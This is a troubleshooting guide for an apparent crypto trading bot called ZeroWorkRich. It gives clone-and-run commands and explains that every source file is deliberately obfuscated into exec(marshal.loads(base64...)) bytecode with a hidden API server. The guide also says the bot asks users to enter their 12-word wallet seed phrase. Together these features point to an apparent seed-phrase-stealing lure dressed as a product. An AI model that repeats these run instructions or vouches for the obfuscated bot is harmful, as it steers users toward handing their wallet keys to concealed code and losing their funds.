# Troubleshooting Guide for GitHub Codespaces

## Problem: AttributeError: module 'os' has no attribute 'Dict'

This error means you're running an old version of the code that wasn't properly obfuscated.

### Solution:

```bash
# 1. Pull latest code
git pull

# 2. Verify obfuscation
python3 verify.py

# Expected output:
# ✓ main.py                        OK (10353 chars)
# ✓ src/__init__.py                OK (617 chars)
# ✓ src/config.py                  OK (4113 chars)
# ... (all files should show OK)

# 3. Test bot functionality
python3 test_bot.py

# Expected output:
# ✅ ALL TESTS PASSED!

# 4. Run the bot
python3 ZeroWorkRich.py
```

## Quick Verification Commands

### Check if files are obfuscated:
```bash
# All Python files should be single-line base64 encoded
head -n 1 main.py
# Should output: import base64,zlib,marshal;exec(marshal.loads(...

head -n 1 src/config.py  
# Should output: import base64,zlib,marshal;exec(marshal.loads(...
```

### Check file sizes:
```bash
wc -l main.py src/*.py
# All files should show "1" line (obfuscated format)
```

## If Still Getting Errors

1. **Delete and re-clone:**
   ```bash
   cd ..
   rm -rf ZeroWork-Rich
   git clone https://github.com/goosyteam-del/ZeroWork-Rich.git
   cd ZeroWork-Rich
   ./setup.sh
   python3 verify.py
   ```

2. **Check Python version:**
   ```bash
   python3 --version
   # Should be Python 3.9 or higher
   ```

3. **Verify dependencies:**
   ```bash
   pip3 list | grep -E "web3|eth-account|colorama"
   # Should show installed packages
   ```

## Expected Behavior

When running `python3 ZeroWorkRich.py`:

1. **Banner displays** (with box-drawing characters)
2. **Prompt appears:** "Enter your 12-word seed phrase:"
3. **Input is hidden** (no echo to terminal)
4. **Balance check starts** across all networks
5. **Trading begins** if balance > $5

## Notes

- **Obfuscation is intentional** - source code is protected
- **Files are single-line** - this is by design
- **Works on Linux/Mac** - Windows may have Unicode display issues
- **API server is hidden** - encoded in bytecode for security

## Contact

If problems persist after following this guide, the obfuscation may need to be regenerated.

---

Last updated: November 3, 2025
